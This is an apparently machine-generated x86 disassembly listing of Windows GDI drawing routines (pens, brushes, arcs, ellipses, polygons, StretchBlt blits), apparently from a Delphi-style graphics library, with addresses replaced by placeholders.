movzx eax [ eax * 2 + rw-data ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_44bb2c
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
call CreatePenIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_44ca28
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_44c690
mov edx esp
mov eax ebx
call sub_44c8f0
add esp 0x10
pop esi
pop ebx
retn
sub_44ca64
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov eax esi
call sub_44ca5c
cmp bl al
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax esi
call sub_44c8d8
mov [ esp + 0xc ] bl
mov edx esp
mov eax esi
call sub_44c8f0
sub_44ca9c
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
cmp esi [ eax + 0x18 ]
je r-xdata
mov edx esp
mov eax ebx
call sub_44c8d8
mov [ esp + 0x8 ] esi
mov edx esp
mov eax ebx
call sub_44c8f0
sub_44cad0
push ebx
push esi
push edi
add esp 0xfffffff4
mov ebx edx
mov esi eax
push esi
mov edi ebx
mov esi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
test esi esi
je r-xdata
add esp 0xc
pop edi
pop esi
pop ebx
retn
push esp
push 0xc
push esi
call GetObjectW
test eax eax
je r-xdata
mov eax [ esp ]
sub eax 0x1
jb r-xdata
mov [ ebx + 0xc ] 0x0
jmp r-xdata
je r-xdata
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] esi
mov [ ebx + 0xc ] 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ esp + 0x8 ]
call sub_4520c4
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_450824
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xd ] 0x1
movzx eax [ esp + 0x8 ]
add al 0x2
mov [ ebx + 0xc ] al
sub_44cb58
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4055c0
mov edx rw-data
mov eax [ rw-data ]
call sub_44afc0
mov [ esi + 0x10 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax esi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_44cba0
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_44b0b8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4312a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_44cbd4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4312cc
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44bb70
xor eax eax
push ebp
push sub_44cc64
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_44bb70
xor eax eax
push ebp
push sub_44cc47
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_44b214
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44cc4e
mov eax [ ebp - 0x8 ]
call sub_44bb80
retn
sub_44cc7c
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
xor eax eax
mov [ edx + 0x8 ] eax
pop edi
pop esi
retn
sub_44cc98
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44bb70
xor eax eax
push ebp
push sub_44ccdd
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_44b188
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44cce4
mov eax [ ebp - 0x4 ]
call sub_44bb80
retn
sub_44ccf0
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp + 0x8 ] edx
mov edx esp
call sub_44cc98
add esp 0x10
pop edi
pop esi
retn
sub_44cd1c
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp esi [ eax + 0x14 ]
je r-xdata
mov eax ebx
call sub_44ce94
cmp al 0x1
jne r-xdata
mov al 0x1
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_44ce94
test al al
jne r-xdata
test al al
je r-xdata
mov al 0x1
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_44cc7c
mov [ esp + 0x4 ] esi
cmp [ esp + 0xc ] 0x1
jne r-xdata
mov edx esp
mov eax ebx
call sub_44cc98
mov [ esp + 0xc ] 0x0
sub_44cd7c
push ebp
mov ebp esp
add esp 0xffffffe8
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
add eax 0x8
push eax
call EnterCriticalSection
xor edx edx
push ebp
push sub_44ce5e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
mov edx eax
sub dl 0x1
jb r-xdata
mov [ ebp - 0x18 ] 0x3
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x78 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x70 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_44bb2c
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x18 ]
push eax
call CreateBrushIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x18 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x18 ] 0x2
and eax 0x7f
sub eax 0x2
mov [ ebp - 0x10 ] eax
sub_44ce70
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_44cad0
mov edx esp
mov eax ebx
call sub_44cc98
add esp 0x10
pop esi
pop ebx
retn
sub_44ce9c
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
cmp bl [ eax + 0x1c ]
je r-xdata
cmp bl 0x1
jne r-xdata
mov al 0x1
jmp r-xdata
xor eax eax
cmp [ eax + 0x14 ] 0xffffff
setne al
jmp r-xdata
test al al
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax esi
call sub_44cc7c
mov eax ebx
mov [ esp + 0xc ] al
cmp al 0x1
jne r-xdata
mov edx esp
mov eax esi
call sub_44cc98
mov [ esp + 0x4 ] 0xffffff
sub_44cf74
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
mov eax [ edx + 0x8 ]
push eax
mov eax [ edx + 0xc ]
push eax
push ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edx ]
mov ecx [ edx + 0x4 ]
mov edx esi
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x7c ]
pop esi
pop ebx
pop ebp
retn 0x4
sub_44cf9c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_44cfbc
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_44cfdc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_44d028
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x34 ] 0x0
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d02f
push rw-data
call LeaveCriticalSection
retn
mov eax ebx
call sub_44cf34
sub_44d060
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4055c0
lea eax [ edi + 0x1c ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_44bfdc
mov esi eax
mov [ edi + 0x40 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_44e14c
lea eax [ edi + 0x1c ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c7a0
mov esi eax
mov [ edi + 0x44 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_44e16c
lea eax [ edi + 0x1c ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_44cb58
mov esi eax
mov [ edi + 0x48 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_44e18c
lea eax [ edi + 0x1c ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x54 ] 0xcc0020
movzx eax [ r-xdata ]
mov [ edi + 0x3c ] al
mov edx edi
mov eax [ rw-data ]
call sub_430fb8
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_44d124
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
mov cl 0x1
mov edx esi
mov eax [ rw-data ]
call sub_4310a4
xor edx edx
mov eax esi
call sub_44dfac
mov eax [ esi + 0x40 ]
call sub_4055f0
mov eax [ esi + 0x44 ]
call sub_4055f0
mov eax [ esi + 0x48 ]
call sub_4055f0
lea eax [ esi + 0x1c ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4312a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_44d184
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
movzx edx [ r-xdata ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
push edi
push esi
mov eax [ ebx + 0x38 ]
push eax
call Arc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x18
sub_44d1d9
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffffd8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
call sub_44cf34
xor eax eax
push ebp
push sub_44d485
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
movzx edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax [ ebp - 0x8 ]
call sub_451144
call sub_44cf34
xor eax eax
push ebp
push sub_44d460
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x8 ]
sub eax [ esi ]
mov [ ebp - 0x10 ] eax
mov eax [ esi + 0xc ]
sub eax [ esi + 0x4 ]
mov [ ebp - 0x14 ] eax
mov edi [ ebx + 0x8 ]
sub edi [ ebx ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
call sub_4514a4
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_450824
mov [ ebp - 0x24 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x24 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x24 ]
call sub_451618
mov eax [ ebp - 0x24 ]
call sub_451144
movzx edx [ r-xdata ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax [ ebp - 0x24 ]
call sub_451144
mov eax [ eax + 0x38 ]
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x74 ]
mov [ ebp - 0x28 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
mov [ ebp - 0x28 ] eax
jmp r-xdata
push 0xcc0020
mov eax [ ebp - 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ ebp - 0x8 ]
call sub_451144
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
call StretchBlt
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
call SetTextColor
mov [ ebp - 0x1c ] eax
push 0xffffff
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
call SetBkColor
mov [ ebp - 0x18 ] eax
push 0xe20746
mov eax [ ebp - 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
call StretchBlt
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
call SetTextColor
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
call SetBkColor
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_451144
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push edi
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
call sub_44e4a0
jmp r-xdata
xor eax eax
push ebp
push sub_44d43e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_451144
movzx edx [ r-xdata ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov eax [ eax + 0x10 ]
cmp [ eax + 0x1c ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d445
sub_44d411
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp [ ebp - 0x28 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
call sub_4055f0
jmp r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
retn
sub_44d495
add [ eax ] al
add [ ecx ] cl
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
movzx edx [ r-xdata ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
push edi
push esi
mov eax [ ebx + 0x38 ]
push eax
call Chord
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x18
sub_44d4f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
movzx edx [ r-xdata ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
movzx edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov edx [ ebx + 0x54 ]
push edx
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
push edx
mov edx [ edi + 0x8 ]
sub edx [ edi ]
push edx
mov edx [ edi + 0x4 ]
push edx
mov edx [ edi ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x38 ]
push edx
mov edx [ esi + 0xc ]
sub edx [ esi + 0x4 ]
push edx
mov edx [ esi + 0x8 ]
mov eax [ esi ]
sub edx eax
push edx
mov edx [ esi + 0x4 ]
push edx
push eax
mov eax [ ebx + 0x38 ]
push eax
call StretchBlt
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_44d57d
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
movzx edx [ r-xdata ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax [ ebx + 0x48 ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
call sub_44bb2c
push eax
mov eax [ ebx + 0x38 ]
push eax
call SetBkColor
mov eax [ ebx + 0x40 ]
mov eax [ eax + 0x18 ]
call sub_44bb2c
push eax
mov eax [ ebx + 0x38 ]
push eax
call SetTextColor
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
add eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
mov ecx eax
add ecx edi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40ab90
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
sub_44d629
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
movzx edx [ r-xdata ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax [ ebx + 0x48 ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
call sub_44bb2c
push eax
mov eax [ ebx + 0x38 ]
push eax
call SetBkColor
mov eax [ ebx + 0x40 ]
mov eax [ eax + 0x18 ]
call sub_44bb2c
push eax
mov eax [ ebx + 0x38 ]
push eax
call SetTextColor
movzx eax [ ebp + 0x8 ]
push eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
add eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
mov ecx eax
add ecx edi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40ab90
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x18 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
sub_44d6dd
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
movzx edx [ r-xdata ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
push esi
mov eax [ ebx + 0x38 ]
push eax
call DrawFocusRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
pop esi
pop ebx
retn
sub_44d70f
add [ ecx ] cl
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
movzx edx [ r-xdata ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
mov eax [ ebx + 0x38 ]
push eax
call Ellipse
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_44d759
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
movzx edx [ sub_44d794 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax [ ebx + 0x48 ]
call sub_44cd7c
push eax
push esi
mov eax [ ebx + 0x38 ]
push eax
call FillRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
pop esi
pop ebx
retn
sub_44d794
or [ eax ] eax
add [ eax ] al
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
movzx edx [ r-xdata ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
movzx eax [ ebp + 0x8 ]
movzx eax [ eax * 2 + rw-data ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
mov eax [ ebx + 0x38 ]
push eax
call ExtFloodFill
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_44d7e5
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
movzx edx [ sub_44d820 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax [ ebx + 0x48 ]
call sub_44cd7c
push eax
push esi
mov eax [ ebx + 0x38 ]
push eax
call FrameRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
pop esi
pop ebx
retn
sub_44d82c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
movzx edx [ r-xdata ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
push edi
push esi
mov eax [ ebx + 0x38 ]
push eax
call LineTo
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
pop edi
pop esi
pop ebx
retn
sub_44d861
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov edi ecx
mov esi edx
mov ebx eax
movzx edx [ r-xdata ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
push 0x0
push edi
push esi
mov eax [ ebx + 0x38 ]
push eax
call MoveToEx
pop edi
pop esi
pop ebx
retn
sub_44d88d
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
movzx edx [ r-xdata ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
push edi
push esi
mov eax [ ebx + 0x38 ]
push eax
call Pie
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x18
sub_44d8e5
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
movzx edx [ r-xdata ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
inc edi
push edi
push esi
mov eax [ ebx + 0x38 ]
push eax
call Polygon
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
pop edi
pop esi
pop ebx
retn
sub_44d91d
add [ eax ] al
add [ 0x53000000 ] cl
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
movzx edx [ r-xdata ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
inc edi
push edi
push esi
mov eax [ ebx + 0x38 ]
push eax
call Polyline
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
pop edi
pop esi
pop ebx
retn
sub_44d95d
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
movzx edx [ r-xdata ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
inc edi
push edi
push esi
mov eax [ ebx + 0x38 ]
push eax
call PolyBezier
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
pop edi
pop esi
pop ebx
retn
sub_44d995
add [ eax ] al
add [ 0x53000000 ] cl
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
movzx edx [ r-xdata ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
inc edi
push edi
push esi
mov eax [ ebx + 0x38 ]
push eax
call PolyBezierTo
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
pop edi
pop esi
pop ebx
retn
sub_44d9d5
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
movzx edx [ r-xdata ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
mov eax [ ebx + 0x38 ]
push eax
call Rectangle
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
